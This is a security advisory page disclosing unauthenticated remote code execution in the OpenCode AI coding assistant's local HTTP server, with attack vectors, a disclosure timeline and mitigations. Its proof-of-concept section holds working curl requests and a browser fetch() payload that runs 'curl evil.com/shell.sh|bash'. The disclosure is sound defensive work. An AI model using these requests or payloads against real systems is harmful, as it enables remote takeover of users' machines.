<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://cy.md/opencode-rce/">Original</a>
    <h1>Unauthenticated remote code execution in OpenCode</h1>
    
    <div id="readability-page-1" class="page">
  
  <p><strong>Affected software:</strong> <a href="https://github.com/anomalyco/opencode">OpenCode</a> (npm: <code>opencode-ai</code>)</p>

  <div>
    <p><strong>TL;DR:</strong></p><ul>
      <li><strong>Before v1.1.10</strong>, OpenCode automatically and silently started an unauthenticated web server which allowed connecting peers to execute arbitrary code.</li>
      <li><strong>Before v1.0.216</strong>, any website could execute arbitrary code on your machine if OpenCode was running — no user interaction or configuration necessary.</li>
      <li><strong>Since v1.1.10</strong>, the server is disabled by default, but when enabled (via flags or config) it remains completely unauthenticated.</li>
    </ul>
  </div>

  <h2>Vulnerability Summary</h2>

  <p>OpenCode is an open-source AI coding assistant. Prior to v1.1.10, it automatically spawned an HTTP server (default port 4096+) on startup. Since v1.1.10, the server is disabled by default but can be enabled via command-line flags or configuration file. When running, the server exposes endpoints for:</p>
  <ul>
    <li>Executing arbitrary shell commands (<code>POST /session/:id/shell</code>)</li>
    <li>Creating interactive terminal sessions (<code>POST /pty</code>)</li>
    <li>Reading arbitrary files (<code>GET /file/content</code>)</li>
  </ul>

  <p><strong>This server has no authentication.</strong> Any client that can connect to it gains full code execution with the privileges of the user running OpenCode. When the server is running, there is no visible indication to the user.</p>

  <p><strong>Note:</strong> The CORS policy <a href="https://github.com/anomalyco/opencode/blob/7d2d87fa2c44e32314015980bb4e59a9386e858c/packages/opencode/src/server/server.ts#L115-L118">hardcodes <code>*.opencode.ai</code></a> as an allowed origin. This means any page served from opencode.ai or its subdomains can access the server API when it&#39;s running. If opencode.ai is ever compromised, or an XSS vulnerability is found on any subdomain, attackers could exploit all users who have the server enabled.
  </p>

  <h2>Attack Vectors</h2>

  <table>
    <thead>
      <tr>
        <th>Attack Vector</th>
        <th>Affected Versions</th>
        <th>Status</th>
        <th>Vendor Advisory</th>
      </tr>
    </thead>
    <tbody>
      <tr>
        <td>Any website can execute code on any OpenCode user&#39;s machine</td>
        <td>&lt; 1.0.216</td>
        <td>Fixed in v1.0.216</td>
        <td>Silent fix</td>
      </tr>
      <tr>
        <td>Any process on the local machine can execute code as the OpenCode user</td>
        <td>&lt; 1.1.10</td>
        <td>Mitigated in v1.1.10</td>
        <td>Silent fix</td>
      </tr>
      <tr>
        <td>Any web page served from localhost/127.0.0.1 can execute code</td>
        <td>&lt; 1.1.10</td>
        <td>Mitigated in v1.1.10</td>
        <td>Silent fix</td>
      </tr>
      <tr>
        <td>When server is enabled, any local process can execute code without authentication</td>
        <td>All versions</td>
        <td>Unfixed</td>
        <td>None</td>
      </tr>
      <tr>
        <td>When server is enabled, any web page served from localhost/127.0.0.1 can execute code</td>
        <td>All versions</td>
        <td>Unfixed</td>
        <td>None</td>
      </tr>
      <tr>
        <td>No indication when server is running (users may be unaware of exposure)</td>
        <td>All versions</td>
        <td>Unfixed</td>
        <td>None</td>
      </tr>
      <tr>
        <td>With <code>--mdns</code>, any machine on the local network can execute code</td>
        <td>All versions</td>
        <td>Unfixed</td>
        <td>None</td>
      </tr>
      <tr>
        <td>*.opencode.ai can execute code when server is running</td>
        <td>All versions</td>
        <td>Unfixed</td>
        <td>None</td>
      </tr>
      <tr>
        <td>If opencode.ai is compromised, attackers gain access to users with server enabled</td>
        <td>All versions</td>
        <td>Unfixed</td>
        <td>None</td>
      </tr>
      <tr>
        <td>Any XSS on opencode.ai can compromise users with server enabled</td>
        <td>All versions</td>
        <td>Unfixed</td>
        <td>None</td>
      </tr>
    </tbody>
  </table>

  <h2>Proof of Concept</h2>

  <h3>Local Exploitation (when server is enabled)</h3>
  <p>Any process on the machine can execute commands when the server is running:</p>
  <pre><code>API=&#34;http://127.0.0.1:4096&#34;
SESSION=$(curl -s -X POST &#34;$API/session&#34; -H &#34;Content-Type: application/json&#34; -d &#39;{}&#39; | jq -r &#39;.id&#39;)
curl -s -X POST &#34;$API/session/$SESSION/shell&#34; \
  -H &#34;Content-Type: application/json&#34; \
  -d &#39;{&#34;agent&#34;:&#34;build&#34;,&#34;command&#34;:&#34;id &gt; /tmp/pwned.txt&#34;}&#39;</code></pre>

  <h3>Browser-Based Exploitation (pre-v1.0.216)</h3>
  <p>Before the CORS fix, any website could silently exploit visitors:</p>
  <pre><code>fetch(&#39;http://127.0.0.1:4096/session&#39;, {
  method: &#39;POST&#39;,
  headers: {&#39;Content-Type&#39;: &#39;application/json&#39;},
  body: &#39;{}&#39;
}).then(r =&gt; r.json()).then(s =&gt; {
  fetch(`http://127.0.0.1:4096/session/${s.id}/shell`, {
    method: &#39;POST&#39;,
    headers: {&#39;Content-Type&#39;: &#39;application/json&#39;},
    body: JSON.stringify({agent:&#39;build&#39;, command:&#39;curl evil.com/shell.sh|bash&#39;})
  })
})</code></pre>
  <p>Confirmed working in Firefox. Chrome&#39;s Local Network Access protection may prompt users.</p>

  <h2>Mitigations for Users</h2>

  <div>
    <p><strong>Immediate actions:</strong></p><ul>
      <li><strong>Check your version</strong> by running <code>opencode --version</code></li>
      <li><strong>Update to v1.1.10 or newer</strong> to ensure the server is disabled by default</li>
      <li>Check your config file for <code>server.port</code> or <code>server.hostname</code> settings which silently enable the server</li>
      <li>Do <strong>not</strong> use the <code>--mdns</code> flag (binds to 0.0.0.0 without warning)</li>
      <li>If you must enable the server, do <strong>not</strong> visit opencode.ai or any subdomains while it is running</li>
      <li>Be aware that when the server is enabled, any local process can exploit it without authentication</li>
    </ul>
  </div>

  <h2>Disclosure Timeline</h2>

  <table>
    <thead>
      <tr>
        <th>Date</th>
        <th>Action</th>
        <th>Response (at disclosure)</th>
      </tr>
    </thead>
    <tbody>
      <tr>
        <td>2025-11-17</td>
        <td>Reported via email to <code>support@sst.dev</code> per <a href="https://github.com/anomalyco/opencode-sdk-js/blob/main/SECURITY.md">SECURITY.md</a></td>
        <td>No response</td>
      </tr>
      <tr>
        <td>2025-12-27</td>
        <td>Filed <a href="https://github.com/anomalyco/opencode/security/advisories/GHSA-vxw4-wv6m-9hhh">GitHub Security Advisory</a></td>
        <td>No response</td>
      </tr>
      <tr>
        <td>2025-12-29</td>
        <td>Issue independently <a href="https://github.com/anomalyco/opencode/issues/6355">publicly reported</a> by another user</td>
        <td>—</td>
      </tr>
      <tr>
        <td>2025-12-30</td>
        <td>Partial fix: <a href="https://github.com/anomalyco/opencode/commit/7d2d87fa2c44e32314015980bb4e59a9386e858c">CORS restricted</a> in v1.0.216</td>
        <td>—</td>
      </tr>
      <tr>
        <td>2026-01-07</td>
        <td>Escalated to community Discord</td>
        <td>No response</td>
      </tr>
      <tr>
        <td>2026-01-08</td>
        <td>Follow-up via <a href="https://github.com/anomalyco/opencode/issues/6355#issuecomment-3722882853">issue comment</a></td>
        <td>Upstream responded to issue</td>
      </tr>
      <tr>
        <td>2026-01-09</td>
        <td>Server <a href="https://github.com/anomalyco/opencode/commit/982b71e861e538c33382ae34049f312f46f37cd2">disabled by default</a> in v1.1.10</td>
        <td>—</td>
      </tr>
      <tr>
        <td>2026-01-11</td>
        <td>Full public disclosure</td>
        <td>—</td>
      </tr>
    </tbody>
  </table>

  <h2>Recommendations</h2>

  <ul>
    <li>Restrict CORS to minimal required set (done in v1.0.216)</li>
    <li>Disable server by default (done in v1.1.10)</li>
    <li>Require authentication for all server requests</li>
    <li>Clearly indicate to users when the server is running (e.g., startup message or persistent UI indicator)</li>
    <li>Improve <code>--mdns</code> documentation to clearly explain it binds to 0.0.0.0 and allows any machine on the local network full access</li>
    <li>Enforce TLS for server communication over network connections</li>
    <li>Publish the <a href="https://github.com/anomalyco/opencode/security/advisories/GHSA-vxw4-wv6m-9hhh">GitHub Security Advisory</a> and obtain CVE (<a href="https://www.cve.org/CVERecord?id=CVE-2026-22812">CVE-2026-22812</a>)</li>
    <li>Ensure the security reporting email address is monitored</li>
    <li>Ensure GHSA notifications are monitored</li>
    <li>Clarify trust relationship between OpenCode maintainers, opencode.ai, and OpenCode users</li>
  </ul>

  <h2>Contact</h2>

  <p>Questions about this disclosure: <a href="https://cy.md/">cy.md</a></p>

  <div>
    <p><strong>Last updated:</strong> 2026-01-12</p>
    <p><em>Code analysis and documentation assisted by Claude AI (Opus 4.5).</em></p>
  </div>


</div>
  </body>
</html>
